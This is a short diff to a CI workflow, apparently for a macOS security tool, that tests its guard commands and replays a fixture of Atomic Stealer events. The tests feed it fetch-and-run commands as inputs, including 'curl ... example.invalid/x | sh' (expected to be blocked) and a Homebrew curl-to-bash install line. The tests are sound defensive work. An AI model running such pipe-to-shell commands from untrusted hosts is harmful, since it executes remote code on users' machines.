@@ -63,8 +63,9 @@ jobs:
           $M check /System/Applications/Calculator.app
           $M guard history
           $M guard check -- ls -la
+          $M guard inspect --no-run -- '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"'
           $M watch --replay Tests/Fixtures/eslogger-amos-sample.jsonl | tee /dev/stderr | grep -q 'Replayed 3 events: 4 alerts'
-          ! $M guard check -- "curl -s https://example.invalid/x | sh"
+          set +e; $M guard check -- "curl -s https://example.invalid/x | sh"; [ $? -eq 3 ]; set -e
           MACX_OWN_RESPONSIBILITY=1 $M privacy | grep -q 'macx itself'
           $M undo list
 
